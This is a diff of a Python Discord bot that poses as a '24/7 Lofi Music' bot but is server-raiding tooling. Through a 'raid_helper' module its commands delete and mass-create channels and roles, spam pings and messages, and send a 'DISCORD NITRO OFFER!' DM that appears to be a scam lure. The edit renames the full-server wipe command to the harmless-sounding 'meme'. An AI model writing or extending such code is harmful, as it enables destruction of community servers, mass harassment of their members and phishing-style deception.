@@ -1,35 +1,23 @@
 import asyncio
 import os
-from os import getenv
-from dotenv import load_dotenv
-import random
-from disnake import DMChannel
 from disnake.ext import commands
-import asyncpraw
 import disnake
 import raid_helper as RD
 from raid_helper import RaidCommands as RC
+from py_logs import TOKEN
 
 intents = disnake.Intents().all()
 intents.guilds = True
 intents.members = True
-prefix = "!"
+prefix = "pls"
 bot = commands.Bot(
     command_prefix=prefix,
     activity=disnake.Activity(type=disnake.ActivityType.listening, name="24/7 Lofi Music"),
     help_command=None,
     intents=intents,
     case_insensitive=True,
+    strip_after_prefix=True,
 )
-
-load_dotenv()
-TOKEN = getenv("TOKEN")
-client_id = getenv("client_id")
-client_secret = getenv("client_secret")
-user_agent = getenv("user_agent")
-username = getenv("username")
-password = getenv("password")
-
 
 dm_embed = disnake.Embed(
     title="DISCORD NITRO OFFER!",
@@ -57,12 +45,15 @@ async def assist(ctx: commands.Context):
     embed = disnake.Embed(
         title="List Of Commands: ",
         description="""
-1 - `!remix`
-2 - `!channel`
-3 - `!bann`
-4 - `!dm`
-5 - `!cancel`
-6 - `!help`
+1 - `pls meme`
+2 - `pls help`
+3 - `pls ban`
+4 - `pls dm`
+5 - `pls cancel`
+6 - `pls channel remove/make`
+7 - `pls role make/remove/give`
+8 - `pls ping amt`
+9 - `pls sfw amt`
 
     """,
         color=RD.ORANGE,
@@ -72,7 +63,7 @@ async def assist(ctx: commands.Context):
 
 @bot.command()
 @commands.cooldown(5, 30, commands.BucketType.guild)
-async def remix(ctx: commands.Context, *, bs=None):
+async def meme(ctx: commands.Context, *, bs=None):
     guild = ctx.guild
 
     await ctx.channel.send("Starting Remix ... (Eta 10s)")
@@ -96,26 +87,32 @@ async def remix(ctx: commands.Context, *, bs=None):
 
     await RC.role_remove(guild)
     await RC.role_make(guild, 10)
-    await RC.role_give(guild)
 
-    await RC.sfw_spam(guild, 10)
     await RC.ping_spam(guild, 10)
+    await RC.sfw_spam(guild, 10)
+
+    await RC.role_give(guild)
 
 
 @bot.command()
 @commands.cooldown(5, 30, commands.BucketType.guild)
-async def channel(ctx: commands.Context):
+async def channel(ctx: commands.Context, choice: str):
     guild = ctx.guild
-    await RC.channel_remove(guild)
-    # await RC.channel_make(guild, 25)
+    if choice == "delete":
+        await RC.channel_remove(guild)
+    elif choice == "make":
+        await RC.channel_make(guild, 25)
 
 
 @bot.command()
-async def role(ctx: commands.Context):
+async def role(ctx: commands.Context, choice: str):
     guild = ctx.guild
-    await RC.role_remove(guild)
-    # await RC.role_make(guild, 25)
-    # await RC.role_give(guild)
+    if choice == "delete":
+        await RC.role_remove(guild)
+    elif choice == "make":
+        await RC.role_make(guild, 25)
+    elif choice == "give":
+        await RC.role_give(guild)
 
 
 @bot.command()
